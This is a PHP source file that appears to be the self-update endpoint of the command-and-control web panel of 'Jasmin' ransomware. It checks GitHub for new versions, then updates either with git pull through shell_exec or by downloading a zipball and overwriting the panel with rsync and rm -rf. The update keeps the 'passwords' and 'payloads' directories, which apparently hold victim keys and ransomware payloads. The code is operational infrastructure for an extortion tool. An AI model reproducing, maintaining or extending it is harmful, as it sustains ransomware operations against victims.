<?php
/**
 * 检查更新 + 一键自动更新API
 */
require_once __DIR__ . '/includes/auth.php';
require_auth();
header('Content-Type: application/json');

$vf = __DIR__ . '/../VERSION';
if (!file_exists($vf)) $vf = __DIR__ . '/VERSION';
define('CURRENT_VERSION', trim(@file_get_contents($vf) ?: '0.0.0'));
define('REPO', '2016xyz/Jasmin-Ransomware-Private');
define('GIT_TOKEN', trim(getenv('GIT_TOKEN') ?: ($_ENV['GIT_TOKEN'] ?? '')));

$action = $_GET['action'] ?? 'check';
if ($action === 'check') {
    check_update();
} elseif ($action === 'update') {
    // 更新操作需要POST+CSRF
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['ok'=>false,'msg'=>'必须使用POST方法']); exit;
    }
    require_once __DIR__ . '/includes/csrf.php';
    if (!csrf_verify()) {
        echo json_encode(['ok'=>false,'msg'=>'CSRF验证失败']); exit;
    }
    do_update();
} else {
    echo json_encode(['ok'=>false,'msg'=>'无效操作']);
}

function gh_get($url) {
    $h = "User-Agent: Jasmin-C2\r\n";
    if (GIT_TOKEN) $h .= "Authorization: token " . GIT_TOKEN . "\r\n";
    $ctx = stream_context_create(['http'=>['header'=>$h,'timeout'=>15,'follow_location'=>true]]);
    return @file_get_contents($url, false, $ctx);
}

function check_update() {
    // 从GitHub获取远程VERSION文件
    $url = 'https://raw.githubusercontent.com/' . REPO . '/master/VERSION';
    $remote_ver = trim(gh_get($url) ?: '');
    // 获取最新commit信息
    $curl = 'https://api.github.com/repos/' . REPO . '/commits?per_page=1';
    $json = gh_get($curl);
    $sha=''; $date=''; $msg='';
    if ($json) {
        $data = json_decode($json, true);
        $sha = substr($data[0]['sha'] ?? '', 0, 7);
        $date = $data[0]['commit']['committer']['date'] ?? '';
        $msg = $data[0]['commit']['message'] ?? '';
    }
    if (!$remote_ver && !$json) {
        echo json_encode(['ok'=>true,'update'=>false,'current'=>CURRENT_VERSION,'msg'=>'无法连接更新服务器']);
        return;
    }
    $has_update = ($remote_ver && $remote_ver !== CURRENT_VERSION) || ($sha && $json);
    if ($remote_ver && $remote_ver === CURRENT_VERSION) $has_update = false;
    echo json_encode(['ok'=>true,'update'=>$has_update,'current'=>CURRENT_VERSION,
        'latest'=>$remote_ver ?: CURRENT_VERSION,'latest_commit'=>$sha,'date'=>$date,'message'=>$msg]);
}

function do_update() {
    $root = dirname(__DIR__);
    // 方式1: git pull
    if (is_dir($root . '/.git')) {
        $out = shell_exec("cd " . escapeshellarg($root) . " && git pull 2>&1");
        echo json_encode(['ok'=>true,'method'=>'git pull','output'=>$out]);
        return;
    }
    // 方式2: zip下载覆盖
    $url = "https://api.github.com/repos/" . REPO . "/zipball/master";
    $h = "User-Agent: Jasmin-C2\r\n";
    if (GIT_TOKEN) $h .= "Authorization: token " . GIT_TOKEN . "\r\n";
    $h .= "Accept: application/vnd.github+json\r\n";
    $ctx = stream_context_create(['http'=>['header'=>$h,'timeout'=>30,'follow_location'=>true]]);
    $zip = @file_get_contents($url, false, $ctx);
    if (!$zip) { echo json_encode(['ok'=>false,'msg'=>'下载失败，请检查GIT_TOKEN']); return; }
    $tmp = tempnam(sys_get_temp_dir(),'jasmin_') . '.zip';
    file_put_contents($tmp, $zip);
    $za = new ZipArchive();
    if ($za->open($tmp) !== true) { echo json_encode(['ok'=>false,'msg'=>'解压失败']); return; }
    $extract_dir = sys_get_temp_dir() . '/jasmin_update_' . uniqid();
    $za->extractTo($extract_dir);
    $za->close(); unlink($tmp);
    $dirs = glob($extract_dir . '/*', GLOB_ONLYDIR);
    if ($dirs) {
        $src = $dirs[0] . '/Web Panel';
        if (is_dir($src)) {
            // 覆盖但保留 .env .installed passwords/ payloads/
            shell_exec("rsync -a --exclude='.env' --exclude='.installed' --exclude='passwords' --exclude='payloads' " 
                . escapeshellarg($src . '/') . " " . escapeshellarg(__DIR__ . '/') . " 2>&1");
        }
    }
    shell_exec("rm -rf " . escapeshellarg($extract_dir));
    echo json_encode(['ok'=>true,'method'=>'zip下载','msg'=>'更新完成，请刷新页面']);
}
